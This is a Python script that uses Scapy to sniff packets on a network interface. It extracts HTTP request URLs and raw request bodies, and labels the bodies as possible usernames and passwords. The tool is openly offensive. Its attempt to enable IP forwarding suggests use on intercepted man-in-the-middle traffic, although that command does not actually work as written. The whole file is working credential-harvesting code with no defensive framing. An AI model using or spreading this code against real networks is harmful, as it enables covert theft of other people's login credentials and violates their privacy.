from scapy.all import *
from scapy.layers import http
import argparse
import subprocess

from scapy.layers.inet import IP


class Sniffer:

    def sniffer(self, interface):
        sniff(iface=interface, store=False, prn=self.process_packet_sniffed)

    def get_interface(self):
        if conf.route.route("0.0.0.0")[2] == "0.0.0.0":
            print("Please Connect to the internet :( ")
        parser = argparse.ArgumentParser()
        parser.add_argument("-i", "--interface", dest="interface", help="Provide an interface")
        values = parser.parse_args()
        if values.interface:
            return values.interface
        else:
            print("[+] If no interface is given, sniffing will happen on default interface")
            return conf.iface

    def get_url(self, pkt):
        return pkt[http.HTTPRequest].Host + pkt[http.HTTPRequest].Path

    def get_login_info(self, pkt):
        if pkt.haslayer(Raw):
            load = pkt[Raw].load.decode()
            return str(load)

    def process_packet_sniffed(self, pkt):
        if pkt.haslayer(IP):
            user_ip = pkt[IP].src
        if pkt.haslayer(http.HTTPRequest):
            url = self.get_url(pkt)
            if url:
                print("\n[+]---[IP |" + user_ip + "|] HTTP REQUEST URL >> " + str(url) + "\n")
            login_info = self.get_login_info(pkt)
            if login_info:
                print("\n[+]---[IP |" + user_ip + "|] POSSIBLE USER ID/PASSWORD >> " + str(login_info) + "\n")

    def execute_pkt_sniffer(self):
        interface = self.get_interface()
        subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
        self.sniffer(interface)


obj = Sniffer()
obj.execute_pkt_sniffer()
